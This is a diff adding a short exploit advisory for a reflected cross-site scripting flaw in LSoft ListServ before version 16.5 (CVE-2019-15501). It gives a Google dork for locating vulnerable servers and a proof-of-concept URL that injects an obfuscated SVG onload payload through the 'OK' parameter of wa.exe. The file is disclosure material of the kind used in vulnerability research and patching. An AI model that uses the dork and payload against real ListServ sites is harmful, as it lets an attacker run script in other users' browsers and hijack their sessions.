@@ -1,0 +1,23 @@
+# Exploit Title: LSoft ListServ < 16.5 - Cross-Site Scripting (XSS)
+# Google Dork: intitle:LISTSERV 16.5
+# Date: 08-21-2019
+# Exploit Author: MTK (http://mtk911.cf/)
+# Vendor Homepage: http://www.lsoft.com/
+# Softwae Link: http://www.lsoft.com/products/listserv.asp
+# Version: Older than Ver 16.5-2018a
+# Tested on: IIS 8.5/10.0 - Firefox/Windows
+# CVE : CVE-2019-15501
+
+# Software description:
+The term Listserv has been used to refer to electronic mailing list software applications in general, 
+but is more properly applied to a few early instances of such software, which allows a sender to send one 
+email to the list, and then transparently sends it on to the addresses of the subscribers to the list. 
+
+# POC
+
+1. 	http://127.0.0.1/scripts/wa.exe?OK=<PAYLOAD>
+2.	http://127.0.0.1/scripts/wa.exe?OK=<svg/onload=%26%23097lert%26lpar;'MTK')>
+
+# References:
+1.	http://www.lsoft.com/manuals/16.5/LISTSERV16.5-2018a_WhatsNew.pdf
+2.	https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15501
